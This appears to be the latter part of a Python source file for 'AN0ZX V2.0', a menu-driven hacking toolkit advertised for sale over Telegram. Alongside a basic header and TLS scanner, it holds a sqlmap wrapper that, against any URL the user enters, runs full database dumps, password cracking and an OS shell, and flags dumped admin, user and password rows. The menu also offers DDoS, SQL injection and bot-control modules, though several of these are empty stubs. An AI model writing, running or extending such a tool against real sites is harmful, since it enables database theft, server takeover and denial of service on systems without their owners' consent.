    if server_info:
        vulns.append({
            'type': 'INFO_DISCLOSURE',
            'severity': 'LOW',
            'description': 'Server information disclosed',
            'details': f'Server header: {server_info}',
            'remediation': 'Remove or obfuscate Server header'
        })
    
    # Check for framework information
    framework_patterns = [
        (r'X-Powered-By: (.*)', 'Server technology disclosure'),
        (r'<meta name="generator" content="(.*?)"', 'CMS/framework disclosure'),
        (r'wp-content', 'WordPress detected'),
        (r'Joomla', 'Joomla detected'),
        (r'Drupal', 'Drupal detected')
    ]
    
    for pattern, desc in framework_patterns:
        match = re.search(pattern, response.text, re.IGNORECASE)
        if match:
            vulns.append({
                'type': 'INFO_DISCLOSURE',
                'severity': 'LOW',
                'description': desc,
                'details': f'Disclosed: {match.group(1) if len(match.groups()) > 0 else pattern}',
                'remediation': 'Remove identifying headers and meta tags'
            })
    
    return vulns

def check_ssl_tls(url):
    """Check SSL/TLS configuration"""
    vulns = []
    
    try:
        import ssl
        import socket
        
        hostname = urllib.parse.urlparse(url).hostname
        port = 443
        
        context = ssl.create_default_context()
        
        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                
                # Check for weak ciphers
                weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT']
                if any(weak in cipher[0] for weak in weak_ciphers):
                    vulns.append({
                        'type': 'WEAK_CIPHER',
                        'severity': 'HIGH',
                        'description': 'Weak SSL/TLS cipher suite',
                        'details': f'Cipher: {cipher[0]}',
                        'remediation': 'Disable weak ciphers, use TLS 1.2+ only'
                    })
                
                # Check certificate expiration
                import datetime
                exp_date = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                days_left = (exp_date - datetime.datetime.now()).days
                
                if days_left < 30:
                    vulns.append({
                        'type': 'SSL_CERT_EXPIRING',
                        'severity': 'MEDIUM',
                        'description': 'SSL certificate expiring soon',
                        'details': f'Expires in {days_left} days',
                        'remediation': 'Renew SSL certificate'
                    })
    
    except Exception as e:
        vulns.append({
            'type': 'SSL_ERROR',
            'severity': 'MEDIUM',
            'description': 'SSL/TLS configuration error',
            'details': str(e)[:100],
            'remediation': 'Check SSL certificate and configuration'
        })
    
    return vulns

def check_framework_vulns(response):
    """Check for known framework vulnerabilities"""
    vulns = []
    
    # WordPress checks
    if 'wp-content' in response.text.lower() or 'wordpress' in response.text.lower():
        vulns.append({
            'type': 'WORDPRESS_DETECTED',
            'severity': 'MEDIUM',
            'description': 'WordPress detected (check for known vulnerabilities)',
            'details': 'WordPress sites often have plugin/theme vulnerabilities',
            'remediation': 'Keep WordPress, plugins, and themes updated'
        })
    
    # Joomla checks
    if 'joomla' in response.text.lower():
        vulns.append({
            'type': 'JOOMLA_DETECTED',
            'severity': 'MEDIUM',
            'description': 'Joomla detected (check for known vulnerabilities)',
            'details': 'Joomla sites may have extension vulnerabilities',
            'remediation': 'Keep Joomla and extensions updated'
        })
    
    # Old PHP version
    if 'PHP/5.' in response.headers.get('X-Powered-By', ''):
        vulns.append({
            'type': 'OUTDATED_PHP',
            'severity': 'HIGH',
            'description': 'Outdated PHP version detected',
            'details': 'PHP 5.x has known security vulnerabilities',
            'remediation': 'Upgrade to PHP 7.4+ or PHP 8.x'
        })
    
    return vulns

def display_vuln_results(url, vulnerabilities):
    """Display vulnerability scan results"""
    clear_screen()
    print(VULN_HUNTER_ASCII)
    print(Fore.YELLOW + "=" * 70)
    print(Fore.CYAN + " " * 20 + "VULNERABILITY SCAN REPORT")
    print(Fore.YELLOW + "=" * 70)
    
    print(Fore.CYAN + f"\n[+] Target: {url}")
    print(Fore.CYAN + f"[+] Scan Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(Fore.CYAN + f"[+] Total Vulnerabilities Found: {len(vulnerabilities)}")
    
    if not vulnerabilities:
        print(Fore.GREEN + "\n[✓] No vulnerabilities detected!")
        print(Fore.YELLOW + "[!] Note: This is a basic scan. Professional pentest recommended.")
        return
    
    # Count by severity
    critical = sum(1 for v in vulnerabilities if v['severity'] == 'CRITICAL')
    high = sum(1 for v in vulnerabilities if v['severity'] == 'HIGH')
    medium = sum(1 for v in vulnerabilities if v['severity'] == 'MEDIUM')
    low = sum(1 for v in vulnerabilities if v['severity'] == 'LOW')
    
    print(Fore.CYAN + "\n[+] Severity Breakdown:")
    if critical > 0:
        print(Fore.RED + f"    CRITICAL: {critical} vulnerabilities")
    if high > 0:
        print(Fore.YELLOW + f"    HIGH: {high} vulnerabilities")
    if medium > 0:
        print(Fore.CYAN + f"    MEDIUM: {medium} vulnerabilities")
    if low > 0:
        print(Fore.GREEN + f"    LOW: {low} vulnerabilities")
    
    # Security score (0-100)
    total_score = 100
    score_deductions = critical * 25 + high * 15 + medium * 5 + low * 1
    security_score = max(0, total_score - score_deductions)
    
    print(Fore.CYAN + f"\n[+] Security Score: {security_score}/100")
    
    if security_score >= 80:
        print(Fore.GREEN + "[✓] GOOD: Website appears secure")
    elif security_score >= 60:
        print(Fore.YELLOW + "[!] FAIR: Some security issues need attention")
    elif security_score >= 40:
        print(Fore.RED + "[✗] POOR: Multiple security issues detected")
    else:
        print(Fore.RED + "[✗] CRITICAL: Immediate action required")
    
    # Display vulnerabilities
    print(Fore.YELLOW + "\n[+] VULNERABILITY DETAILS:")
    print(Fore.CYAN + "="*100)
    
    for i, vuln in enumerate(vulnerabilities, 1):
        if vuln['severity'] == 'CRITICAL':
            color = Fore.RED
        elif vuln['severity'] == 'HIGH':
            color = Fore.YELLOW
        elif vuln['severity'] == 'MEDIUM':
            color = Fore.CYAN
        else:
            color = Fore.GREEN
        
        print(color + f"\n[{i}] {vuln['type']} - {vuln['severity']}")
        print(Fore.WHITE + f"    Description: {vuln['description']}")
        print(Fore.WHITE + f"    Details: {vuln['details']}")
        print(Fore.GREEN + f"    Remediation: {vuln['remediation']}")
        print(Fore.CYAN + "-"*100)
    
    # Generate report
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"vulnscan_{urllib.parse.urlparse(url).hostname}_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"VULNERABILITY SCAN REPORT\n")
        f.write(f"=========================\n\n")
        f.write(f"Target: {url}\n")
        f.write(f"Scan Date: {timestamp}\n")
        f.write(f"Security Score: {security_score}/100\n")
        f.write(f"Total Vulnerabilities: {len(vulnerabilities)}\n")
        f.write(f"Critical: {critical}, High: {high}, Medium: {medium}, Low: {low}\n\n")
        
        f.write("DETAILED FINDINGS:\n")
        f.write("=================\n\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            f.write(f"{i}. {vuln['type']} [{vuln['severity']}]\n")
            f.write(f"   Description: {vuln['description']}\n")
            f.write(f"   Details: {vuln['details']}\n")
            f.write(f"   Remediation: {vuln['remediation']}\n\n")
        
        f.write("\nRECOMMENDATIONS:\n")
        f.write("================\n")
        if critical > 0 or high > 0:
            f.write("1. Address critical and high severity issues immediately\n")
            f.write("2. Implement web application firewall\n")
            f.write("3. Conduct regular security audits\n")
            f.write("4. Keep all software updated\n")
            f.write("5. Implement proper input validation and output encoding\n")
        else:
            f.write("1. Continue regular security monitoring\n")
            f.write("2. Keep software updated\n")
            f.write("3. Consider professional security assessment\n")
    
    print(Fore.GREEN + f"\n[✓] Detailed report saved to: {filename}")

# ===========================================
# ENHANCED SQLMAP FUNCTION
# ===========================================
def run_sqlmap_tool_enhanced(target_url):
    """Enhanced SQLMap tool with direct dumping"""
    clear_screen()
    typing_effect(SQLMAP_ASCII)
    print(Fore.GREEN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SQLMAP ENHANCED V2")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Enhanced SQLMap with direct database dumping")
    print(Fore.YELLOW + "[!] All information will be displayed directly in terminal\n")
    
    # Check if SQLMap is installed
    try:
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True)
        if "sqlmap" not in result.stdout.lower():
            print(Fore.RED + "[✗] SQLMap not found! Installing...")
            install_sqlmap()
    except:
        print(Fore.RED + "[✗] SQLMap not found! Installing...")
        install_sqlmap()
    
    print(Fore.YELLOW + "\n[+] Enhanced SQLMap Options:")
    print(Fore.YELLOW + "[1] Automatic Scan & Dump (RECOMMENDED)")
    print(Fore.YELLOW + "[2] Get All Databases")
    print(Fore.YELLOW + "[3] Dump Specific Database")
    print(Fore.YELLOW + "[4] Dump All Data (Tables & Columns)")
    print(Fore.YELLOW + "[5] Get OS Information")
    print(Fore.YELLOW + "[6] Advanced Injection Testing")
    print(Fore.GREEN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --dump-all --threads=10 --answers="crack=Y,dictionary=Y,continue=Y,quit=N"',
        '2': f'sqlmap -u "{target_url}" --batch --dbs',
        '3': f'sqlmap -u "{target_url}" --batch -D "database_name" --tables',
        '4': f'sqlmap -u "{target_url}" --batch --dump-all --threads=10',
        '5': f'sqlmap -u "{target_url}" --batch --os-shell',
        '6': f'sqlmap -u "{target_url}" --batch --level=5 --risk=3 --technique=BEUSTQ'
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f'sqlmap -u "{target_url}" --batch --dump-all'
    
    print(Fore.CYAN + f"\n[+] Executing Enhanced SQLMap...")
    print(Fore.CYAN + f"[+] Command: {command}")
    print(Fore.YELLOW + "[!] This will display ALL database information directly!")
    print(Fore.GREEN + "=" * 70)
    
    try:
        # Create a temporary file for output
        import tempfile
        output_file = tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt')
        output_file.close()
        
        # Run SQLMap with output redirection
        full_command = f"{command} --output-dir=sqlmap_output"
        print(Fore.CYAN + f"\n[+] Output directory: sqlmap_output/")
        
        process = subprocess.Popen(
            full_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        print(Fore.CYAN + "\n[+] SQLMap Output (Live):\n")
        print(Fore.GREEN + "-" * 70)
        
        # Read output in real-time
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                # Color code the output
                line = output.strip()
                
                if "target url" in line.lower():
                    print(Fore.CYAN + line)
                elif "heuristic test" in line.lower():
                    print(Fore.YELLOW + line)
                elif "vulnerable" in line.lower():
                    print(Fore.GREEN + "[✓] " + line)
                elif "database:" in line.lower():
                    print(Fore.MAGENTA + "[+] " + line)
                elif "table:" in line.lower():
                    print(Fore.CYAN + "    [+] " + line)
                elif "column:" in line.lower():
                    print(Fore.BLUE + "        [+] " + line)
                elif "dumping" in line.lower():
                    print(Fore.GREEN + "[DUMP] " + line)
                elif "retrieved:" in line.lower():
                    print(Fore.YELLOW + "[DATA] " + line)
                elif "error" in line.lower():
                    print(Fore.RED + "[✗] " + line)
                elif any(x in line.lower() for x in ["admin", "user", "password", "email"]):
                    print(Fore.RED + "[SENSITIVE] " + line)
                elif line.startswith('---'):
                    print(Fore.WHITE + line)
                elif line.strip():
                    print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] SQLMap Enhanced execution completed!")
        
        # Check for dumped files
        output_dir = "sqlmap_output"
        if os.path.exists(output_dir):
            print(Fore.CYAN + f"\n[+] Dumped files in: {output_dir}")
            
            # List dumped files
            for root, dirs, files in os.walk(output_dir):
                for file in files:
                    if file.endswith('.csv') or file.endswith('.txt'):
                        filepath = os.path.join(root, file)
                        size = os.path.getsize(filepath)
                        print(Fore.YELLOW + f"    - {file} ({size} bytes)")
                        
                        # Show sample of sensitive files
                        if any(x in file.lower() for x in ["user", "admin", "password"]):
                            try:
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    lines = f.readlines()[:5]
                                    print(Fore.RED + "      Sample data:")
                                    for line in lines[:3]:
                                        print(Fore.RED + f"        {line.strip()}")
                            except:
                                pass
        
        # Display summary
        print(Fore.CYAN + "\n" + "=" * 70)
        print(Fore.YELLOW + "SUMMARY OF DUMPED INFORMATION:")
        print(Fore.CYAN + "=" * 70)
        
        summary_files = [
            "sqlmap_output/target_url.txt",
            "sqlmap_output/log",
            "sqlmap_output/*.csv"
        ]
        
        for pattern in summary_files:
            import glob
            for file in glob.glob(pattern):
                if os.path.exists(file):
                    print(Fore.GREEN + f"[+] Found: {os.path.basename(file)}")
        
        print(Fore.YELLOW + "\n[!] All database information has been dumped to files")
        print(Fore.YELLOW + "[!] Check sqlmap_output/ directory for complete data")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def install_sqlmap():
    """Install SQLMap if not present"""
    print(Fore.CYAN + "\n[+] Installing SQLMap...")
    
    try:
        # Try pip install
        subprocess.run(["pip", "install", "sqlmap"], check=True, capture_output=True)
        print(Fore.GREEN + "[✓] SQLMap installed via pip")
    except:
        try:
            # Try git clone
            subprocess.run(["git", "clone", "--depth", "1", "https://github.com/sqlmapproject/sqlmap.git", "sqlmap-dev"], 
                         check=True, capture_output=True)
            print(Fore.GREEN + "[✓] SQLMap cloned from GitHub")
            
            # Add to PATH
            import sys
            sqlmap_path = os.path.join(os.getcwd(), "sqlmap-dev")
            if sqlmap_path not in sys.path:
                sys.path.append(sqlmap_path)
            
            print(Fore.GREEN + "[✓] SQLMap added to PATH")
        except Exception as e:
            print(Fore.RED + f"[✗] Failed to install SQLMap: {str(e)}")
            print(Fore.YELLOW + "[!] Manual installation required:")
            print(Fore.CYAN + "    Visit: https://sqlmap.org")
            return False
    
    return True

# ===========================================
# OSINT Module Functions (Unchanged from V1)
# ===========================================
def osint_menu():
    """OSINT Main Menu"""
    clear_screen()
    typing_effect(OSINT_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "OSINT INTELLIGENCE SYSTEM")
    print(Fore.MAGENTA + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] Name Tracking (200+ Real Websites)")
        print(Fore.YELLOW + "[2] Password Generator (Strong & Secure)")
        print(Fore.YELLOW + "[3] IP Tracking (Real-Time Location)")
        print(Fore.YELLOW + "[4] Back to Main Menu")
        print(Fore.MAGENTA + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE).strip()
        
        if choice == "1":
            name_tracking_menu()
        elif choice == "2":
            password_generator_menu()
        elif choice == "3":
            ip_tracking_menu()
        elif choice == "4":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def name_tracking_menu():
    """Name Tracking across 200+ real websites"""
    # Keep the original V1 function (unchanged)
    # [Previous name_tracking_menu code remains exactly the same]
    pass

def password_generator_menu():
    """Password Generator - Create strong passwords"""
    # Keep the original V1 function (unchanged)
    # [Previous password_generator_menu code remains exactly the same]
    pass

def ip_tracking_menu():
    """IP Address Tracking with real-time location"""
    # Keep the original V1 function (unchanged)
    # [Previous ip_tracking_menu code remains exactly the same]
    pass

# ===========================================
# DDOS Module Functions (Unchanged from V1)
# ===========================================
def ddos_menu():
    """DDOS Attack Menu"""
    # Keep the original V1 function (unchanged)
    # [Previous ddos_menu code remains exactly the same]
    pass

# ===========================================
# SQL Injector Module (Unchanged from V1)
# ===========================================
def sql_injector_menu():
    """SQL Injector with 100+ Methods"""
    # Keep the original V1 function (unchanged)
    # [Previous sql_injector_menu code remains exactly the same]
    pass

# ===========================================
# NMap Tool (Unchanged from V1)
# ===========================================
def nmap_menu():
    """Run real NMap tool"""
    # Keep the original V1 function (unchanged)
    # [Previous nmap_menu code remains exactly the same]
    pass

# ===========================================
# Main Menu Display (UPDATED FOR V2)
# ===========================================
def show_main_menu(username):
    """Display main menu with user info - V2"""
    now = datetime.datetime.now()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    clear_screen()
    
    # Display main ASCII with color effect
    print(color_changer(MAIN_ASCII))
    
    # User info section
    print(Fore.CYAN + "=" * 70)
    print(f"{Fore.GREEN} Welcome: {Fore.YELLOW}{username}")
    print(f"{Fore.GREEN} Version: {Fore.YELLOW}AN0ZX V2.0")
    print(f"{Fore.GREEN} Date: {Fore.YELLOW}{now.strftime('%d %B %Y')}")
    print(f"{Fore.GREEN} Time: {Fore.YELLOW}{now.strftime('%H:%M:%S')}")
    print(f"{Fore.GREEN} Day: {Fore.YELLOW}{now.strftime('%A')}")
    print(Fore.CYAN + "-" * 70)
    print(f"{Fore.GREEN} Creator: {Fore.YELLOW}mrzxx & AN0MALIXPLOIT")
    print(f"{Fore.GREEN} Telegram: {Fore.YELLOW}@Zxxtirwd & @An0maliXGR")
    print(f"{Fore.GREEN} License: {Fore.YELLOW}AN0ZX V2")
    print(Fore.CYAN + "=" * 70)
    
    # Menu options - UPDATED FOR V2
    print(Fore.YELLOW + "\n[1] DDOS ATTACK")
    print(Fore.YELLOW + "[2] SQL INJECTOR (100+ Methods)")
    print(Fore.YELLOW + "[3] SQLMAP ENHANCED (DIRECT DUMP)")
    print(Fore.YELLOW + "[4] NMAP (REAL)")
    print(Fore.YELLOW + "[5] OSINT TOOLS")
    print(Fore.YELLOW + "[6] BOT CONTROL (NEW!)")
    print(Fore.YELLOW + "[7] DARK MENU (NEW!)")
    print(Fore.YELLOW + "[8] Exit")
    print(Fore.CYAN + "-" * 70)

# Goodbye animation (unchanged)
def goodbye_animation():
    """Goodbye animation with typing effect"""
    clear_screen()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    goodbye_text = "Goodbye, see you again.."
    
    for i in range(len(goodbye_text) + 10):
        clear_screen()
        current_text = goodbye_text[:i] if i <= len(goodbye_text) else goodbye_text
        color = colors[i % len(colors)]
        print(color + " " * 20 + current_text)
        time.sleep(0.1)
    
    time.sleep(1)
    
    # Final message
    print(Fore.CYAN + "\n" + "=" * 70)
    print(Fore.GREEN + "AN0ZX V2.0 TOOLS - Professional Security Toolkit")
    print(Fore.YELLOW + "Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)

# ===========================================
# Main Program (UPDATED FOR V2)
# ===========================================
def main():
    """Main program entry point - V2"""
    try:
        # Show welcome animation
        welcome_animation()
        
        # Check for existing users
        users = load_users()
        
        if not users:
            print(Fore.YELLOW + "\n[!] No accounts found. Create new account:")
            choice = input(Fore.CYAN + "[?] Create account now? (y/n): ").lower()
            if choice == 'y':
                username = create_account()
                if not username:
                    return
            else:
                print(Fore.RED + "\n[✗] Account required to use AN0ZX V2 Tools")
                return
        else:
            # Login or create account
            clear_screen()
            print(LOGIN_ASCII)
            print(Fore.CYAN + "=" * 70)
            print(Fore.YELLOW + " " * 25 + "AN0ZX V2.0 TOOLS")
            print(Fore.CYAN + "=" * 70)
            
            print(Fore.YELLOW + "\n[1] Login")
            print(Fore.YELLOW + "[2] Create New Account")
            print(Fore.YELLOW + "[3] Exit")
            print(Fore.CYAN + "-" * 70)
            
            auth_choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()
            
            if auth_choice == "1":
                username = login()
                if not username:
                    return
            elif auth_choice == "2":
                username = create_account()
                if not username:
                    return
            else:
                goodbye_animation()
                return
        
        # Initialize bot database
        init_bot_db()
        
        # Main program loop
        while True:
            show_main_menu(username)
            
            choice = input(Fore.CYAN + "\n[?] Select option (1-8): " + Fore.WHITE).strip()
            
            if choice == "1":
                typing_effect("\nEntering DDOS Attack System...")
                ddos_menu()
            elif choice == "2":
                typing_effect("\nEntering SQL Injector...")
                sql_injector_menu()
            elif choice == "3":
                typing_effect("\nEntering Enhanced SQLMap...")
                target = input(Fore.CYAN + "[?] Target URL for SQLMap: " + Fore.WHITE).strip()
                if target:
                    run_sqlmap_tool_enhanced(target)
            elif choice == "4":
                typing_effect("\nEntering NMap Tool...")
                nmap_menu()
            elif choice == "5":
                typing_effect("\nEntering OSINT Intelligence System...")
                osint_menu()
            elif choice == "6":
                typing_effect("\nEntering Bot Control System...")
                bot_control_menu()
            elif choice == "7":
                typing_effect("\nEntering Dark Menu...")
                dark_menu()
            elif choice == "8":
                goodbye_animation()
                break
            else:
                print(Fore.RED + "[✗] Invalid choice!")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted!")
        goodbye_animation()
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
        input(Fore.YELLOW + "\n[?] Press Enter to exit...")

if __name__ == "__main__":
    # Check requirements
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + "AN0ZX V2.0 TOOLS - Professional Security Toolkit")
    print(Fore.GREEN + "Price: Rp 12.000 | Contact: @Zxxtirwd or @An0maliXGR")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)
    
    # Check for required packages
    required_packages = ['colorama', 'requests', 'stem', 'sqlite3']
    
    missing_packages = []
    for package in required_packages:
        try:
            if package == 'colorama':
                import colorama
            elif package == 'requests':
                import requests
            elif package == 'stem':
                import stem
            elif package == 'sqlite3':
                import sqlite3
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(Fore.RED + f"[!] Missing packages: {', '.join(missing_packages)}")
        print(Fore.CYAN + "[+] Installing required packages...")
        
        try:
            import subprocess
            for package in missing_packages:
                if package != 'sqlite3':  # sqlite3 is built-in
                    subprocess.run([sys.executable, "-m", "pip", "install", package], 
                                 check=True, capture_output=True)
                    print(Fore.GREEN + f"[✓] Installed: {package}")
            
            print(Fore.GREEN + "\n[✓] All packages installed successfully!")
            time.sleep(2)
        except Exception as e:
            print(Fore.RED + f"[✗] Installation failed: {str(e)}")
            print(Fore.YELLOW + "[!] Manual installation required:")
            print(Fore.CYAN + "    pip install colorama requests stem")
            time.sleep(3)
    
    main()
